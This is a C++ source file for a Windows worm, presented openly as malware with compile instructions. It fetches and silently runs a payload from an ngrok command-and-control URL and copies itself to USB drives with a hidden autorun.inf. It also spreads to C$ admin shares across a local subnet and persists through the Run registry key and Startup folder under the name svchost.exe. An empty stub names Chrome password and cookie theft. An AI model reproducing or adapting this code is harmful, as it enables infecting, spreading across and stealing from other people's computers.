// worm.cpp — Compile: g++ worm.cpp -o worm.exe -lwininet -static
#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <fstream>

#pragma comment(lib, "wininet.lib")

std::string C2_URL = "https://1234-5678.ngrok-free.app/payload.exe";
std::string WORM_NAME = "svchost.exe";
// ========== DOWNLOAD FILE ==========
bool DownloadFile(const std::string& url, const std::string& path) {
    HINTERNET hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hFile = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) return false;
    
    std::ofstream out(path, std::ios::binary);
    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        out.write(buffer, bytesRead);
    }
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
    return true;
}

// ========== EXECUTE ==========
void Execute(const std::string& path) {
    ShellExecute(NULL, "open", path.c_str(), NULL, NULL, SW_HIDE);
}

// ========== SPREAD VIA USB ==========
void SpreadUSB() {
    char selfPath[MAX_PATH];
    GetModuleFileName(NULL, selfPath, MAX_PATH);
    
    for (char drive = 'D'; drive <= 'Z'; drive++) {
        std::string root = std::string(1, drive) + ":\\";
        if (GetDriveType(root.c_str()) == DRIVE_REMOVABLE) {
            CopyFile(selfPath, (root + WORM_NAME).c_str(), FALSE);
            std::ofstream autorun(root + "autorun.inf");
            autorun << "[autorun]\nopen=" << WORM_NAME << "\naction=Open folder to view files\nicon=%SystemRoot%\\system32\\SHELL32.dll,4";
            autorun.close();
            SetFileAttributes((root + "autorun.inf").c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            SetFileAttributes((root + WORM_NAME).c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }
    }
}

// ========== SPREAD VIA NETWORK SHARE ==========
void SpreadNetwork() {
    char selfPath[MAX_PATH];
    GetModuleFileName(NULL, selfPath, MAX_PATH);
    
    for (int i = 1; i < 255; i++) {
        std::string target = "\\\\192.168.1." + std::to_string(i) + "\\C$\\Users\\Public\\" + WORM_NAME;
        CopyFile(selfPath, target.c_str(), FALSE);
    }
}

// ========== PERSISTENCE ==========
void Persistence() {
    char selfPath[MAX_PATH];
    GetModuleFileName(NULL, selfPath, MAX_PATH);
    
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueEx(hKey, "WindowsService", 0, REG_SZ, (BYTE*)selfPath, strlen(selfPath));
    RegCloseKey(hKey);
    
    // Copy to startup folder
    char startup[MAX_PATH];
    GetEnvironmentVariable("APPDATA", startup, MAX_PATH);
    std::string startupPath = std::string(startup) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + WORM_NAME;
    CopyFile(selfPath, startupPath.c_str(), FALSE);
}

// ========== STEAL DATA ==========
void StealData() {
    // Steal Chrome passwords, cookies, etc.
}

// ========== MAIN ==========
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // Download payload
    std::string tempPath = "C:\\Users\\Public\\" + WORM_NAME;
    if (DownloadFile(C2_URL, tempPath)) {
        Execute(tempPath);
    }
    
    // Persistence
    Persistence();
    
    // Main loop
    while (true) {
        SpreadUSB();
        SpreadNetwork();
        StealData();
        Sleep(300000); // 5 minutes
    }
    
    return 0;
}
